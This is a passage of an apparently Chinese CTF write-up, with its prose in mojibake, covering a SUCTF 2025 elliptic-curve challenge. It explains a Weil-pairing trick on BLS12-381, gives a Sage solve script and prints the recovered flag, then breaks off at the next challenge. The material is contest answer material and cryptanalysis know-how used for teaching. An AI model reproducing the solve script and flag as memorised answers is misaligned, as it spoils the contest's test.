linebreak="newline"></mspace><mtext>å½“</mtext><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi><mtext>çš„æ¯”ç‰¹ä½ä¸º</mtext><mn>0</mn><mtext>æ—¶ï¼Œæˆ‘ä»¬æœ‰</mtext><mi>c</mi><msub><mi>s</mi><mi>i</mi></msub><mo>=</mo><mi>a</mi><mo>âˆ—</mo><msub><mi>P</mi><mn>1</mn></msub><mo>+</mo><mi>b</mi><mo>âˆ—</mo><msub><mi>G</mi><mn>2</mn></msub><mo>=</mo><mi>a</mi><mo>âˆ—</mo><mfrac><mi>p</mi><msub><mi>n</mi><mn>2</mn></msub></mfrac><mo>âˆ—</mo><msub><mi>G</mi><mn>1</mn></msub><mo>+</mo><mi>b</mi><mo>âˆ—</mo><msub><mi>G</mi><mn>2</mn></msub><mspace linebreak="newline"></mspace><mtext>å› æ­¤å½“æˆ‘ä»¬ç”¨</mtext><msub><mi>n</mi><mn>2</mn></msub><mtext>ä¹˜ä»¥ä¸Šå¼ä¹‹åï¼Œæœ‰</mtext><mi>c</mi><msub><mi>s</mi><mi>i</mi></msub><mo>=</mo><mi>a</mi><mo>âˆ—</mo><mi>p</mi><mo>âˆ—</mo><mi>G</mi><mn>1</mn><mo>+</mo><mi>b</mi><mo>âˆ—</mo><msub><mi>n</mi><mn>2</mn></msub><mo>âˆ—</mo><msub><mi>G</mi><mn>2</mn></msub><mo>=</mo><msub><mi>k</mi><mi>i</mi></msub><mo>âˆ—</mo><msub><mi>G</mi><mn>2</mn></msub><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi><mspace linebreak="newline"></mspace><mtext>æ ¹æ®åŒçº¿æ€§é…å¯¹çš„æ€§è´¨</mtext><mi>e</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn><mo separator="true">,</mo><mi>e</mi><mo stretchy="false">(</mo><mi>k</mi><mo>âˆ—</mo><mi>a</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mn>1</mn><mi>k</mi></msup><mo>=</mo><mn>1</mn><mspace linebreak="newline"></mspace><mtext>æ‰€ä»¥åªè¦æˆ‘ä»¬éå†</mtext><mi>c</mi><mi>s</mi><mtext>ï¼Œç„¶ååˆ©ç”¨åŒçº¿æ€§é…å¯¹å°±å¯ä»¥åˆ¤æ–­è¿™ä¸ªæ¯”ç‰¹ä¸ºæ˜¯å¦ä¸º</mtext><mn>0</mn><mtext>ï¼›åä¹‹ï¼Œä¸º</mtext><mn>1</mn></mrow><annotation encoding="application/x-tex">P_1=\frac{p}{n_2}*G_1,P_2=\frac{p}{n_2}*G_2 \\å½“flagçš„æ¯”ç‰¹ä½ä¸º0æ—¶ï¼Œæˆ‘ä»¬æœ‰cs_i=a*P_1+b*G_2=a*\frac{p}{n_2}*G_1+b*G_2 \\å› æ­¤å½“æˆ‘ä»¬ç”¨n_2ä¹˜ä»¥ä¸Šå¼ä¹‹åï¼Œæœ‰cs_i=a*p*G1+b*n_2*G_2=k_i*G_2 \mod p \\æ ¹æ®åŒçº¿æ€§é…å¯¹çš„æ€§è´¨e(a,a)=1,e(k*a,a)=1^k=1 \\æ‰€ä»¥åªè¦æˆ‘ä»¬éå†csï¼Œç„¶ååˆ©ç”¨åŒçº¿æ€§é…å¯¹å°±å¯ä»¥åˆ¤æ–­è¿™ä¸ªæ¯”ç‰¹ä¸ºæ˜¯å¦ä¸º0ï¼›åä¹‹ï¼Œä¸º1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.94356em;vertical-align:-0.8360000000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1075599999999999em;"><span style="top:-2.3139999999999996em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.8360000000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.94356em;vertical-align:-0.8360000000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1075599999999999em;"><span style="top:-2.3139999999999996em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.8360000000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">å½“</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">æ¯”</span><span class="mord cjk_fallback">ç‰¹</span><span class="mord cjk_fallback">ä½</span><span class="mord cjk_fallback">ä¸º</span><span class="mord">0</span><span class="mord cjk_fallback">æ—¶</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">æˆ‘</span><span class="mord cjk_fallback">ä»¬</span><span class="mord cjk_fallback">æœ‰</span><span class="mord mathnormal">c</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.94356em;vertical-align:-0.8360000000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1075599999999999em;"><span style="top:-2.3139999999999996em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.8360000000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">å› </span><span class="mord cjk_fallback">æ­¤</span><span class="mord cjk_fallback">å½“</span><span class="mord cjk_fallback">æˆ‘</span><span class="mord cjk_fallback">ä»¬</span><span class="mord cjk_fallback">ç”¨</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">ä¹˜</span><span class="mord cjk_fallback">ä»¥</span><span class="mord cjk_fallback">ä¸Š</span><span class="mord cjk_fallback">å¼</span><span class="mord cjk_fallback">ä¹‹</span><span class="mord cjk_fallback">å</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">æœ‰</span><span class="mord mathnormal">c</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">G</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">æ ¹</span><span class="mord cjk_fallback">æ®</span><span class="mord cjk_fallback">åŒ</span><span class="mord cjk_fallback">çº¿</span><span class="mord cjk_fallback">æ€§</span><span class="mord cjk_fallback">é…</span><span class="mord cjk_fallback">å¯¹</span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">æ€§</span><span class="mord cjk_fallback">è´¨</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">a</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">a</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8991079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">æ‰€</span><span class="mord cjk_fallback">ä»¥</span><span class="mord cjk_fallback">åª</span><span class="mord cjk_fallback">è¦</span><span class="mord cjk_fallback">æˆ‘</span><span class="mord cjk_fallback">ä»¬</span><span class="mord cjk_fallback">é</span><span class="mord cjk_fallback">å†</span><span class="mord mathnormal">c</span><span class="mord mathnormal">s</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">ç„¶</span><span class="mord cjk_fallback">å</span><span class="mord cjk_fallback">åˆ©</span><span class="mord cjk_fallback">ç”¨</span><span class="mord cjk_fallback">åŒ</span><span class="mord cjk_fallback">çº¿</span><span class="mord cjk_fallback">æ€§</span><span class="mord cjk_fallback">é…</span><span class="mord cjk_fallback">å¯¹</span><span class="mord cjk_fallback">å°±</span><span class="mord cjk_fallback">å¯</span><span class="mord cjk_fallback">ä»¥</span><span class="mord cjk_fallback">åˆ¤</span><span class="mord cjk_fallback">æ–­</span><span class="mord cjk_fallback">è¿™</span><span class="mord cjk_fallback">ä¸ª</span><span class="mord cjk_fallback">æ¯”</span><span class="mord cjk_fallback">ç‰¹</span><span class="mord cjk_fallback">ä¸º</span><span class="mord cjk_fallback">æ˜¯</span><span class="mord cjk_fallback">å¦</span><span class="mord cjk_fallback">ä¸º</span><span class="mord">0</span><span class="mord cjk_fallback">ï¼›</span><span class="mord cjk_fallback">å</span><span class="mord cjk_fallback">ä¹‹</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">ä¸º</span><span class="mord">1</span></span></span></span></span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">import</span> ast<br><br><span class="hljs-comment"># BLS12-381 curve</span><br>p = <span class="hljs-number">0x1a0111ea397fe69a4b1ba7b6434bacd764774b84f38512bf6730d2a0f6b0f6241eabfffeb153ffffb9feffffffffaaab</span><br>K = GF(p)<br>E = EllipticCurve(K, (<span class="hljs-number">0</span>, <span class="hljs-number">4</span>))<br>o = <span class="hljs-number">793479390729215512516507951283169066088130679960393952059283337873017453583023682367384822284289</span><br>n1, n2 = <span class="hljs-number">859267</span>, <span class="hljs-number">52437899</span><br>cs = ast.literal_eval(<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;chall.txt&quot;</span>).read())<br>cs = [E(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> cs]<br><br>is0=cs[<span class="hljs-number">0</span>]<br>is0=is0*n2<br><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cs:<br>    tmp=is0.weil_pairing(i*n2,o)<br>    <span class="hljs-keyword">if</span> tmp==<span class="hljs-number">1</span>:<br>        flag+=<span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        flag+=<span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(flag,<span class="hljs-number">2</span>)))<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">01010011010101010100001101010100010001100111101101010111011001010011000101100011011011110110110101100101010111110101111101010100001100000101111101011111010100110101010101000011010101000100011001011111010111110011001000110000001100100011010101111101</span><br><span class="hljs-string">b&#x27;SUCTF&#123;We1come__T0__SUCTF__2025&#125;&#x27;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h2 id="su_mathgame"><a class="markdownIt-Anchor" href="#su_mathgame"></a> SU_mathgame</h2><h3 id="é¢˜ç›®-2"><a class="markdownIt-Anchor" href="#é¢˜ç›®-2"></a> é¢˜ç›®</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span 